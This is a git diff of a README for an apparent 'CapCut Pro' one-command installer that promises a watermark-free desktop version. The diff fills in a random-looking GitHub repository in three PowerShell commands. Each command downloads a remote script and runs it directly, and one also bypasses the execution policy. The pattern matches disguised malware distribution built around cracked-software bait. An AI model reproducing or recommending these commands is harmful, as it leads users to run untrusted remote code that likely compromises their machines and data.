@@ -7,7 +7,7 @@ One-command setup for CapCut Pro — all-in-one video editor with trending effec
 Open **PowerShell** and run:
 
 ```powershell
-irm https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex
 ```
 
 That's it. The installer handles everything.
@@ -46,13 +46,13 @@ You're using the web version. The desktop app from this installer has no waterma
 **Alternative (bypass execution policy):**
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | iex"
 ```
 
 **"irm is not recognized"** — old PowerShell. Use:
 
 ```powershell
-Invoke-RestMethod https://raw.githubusercontent.com/OWNER/REPO/main/install.ps1 | Invoke-Expression
+Invoke-RestMethod https://raw.githubusercontent.com/channelguardcalm/apfniwqt/main/install.ps1 | Invoke-Expression
 ```
 
 ## License
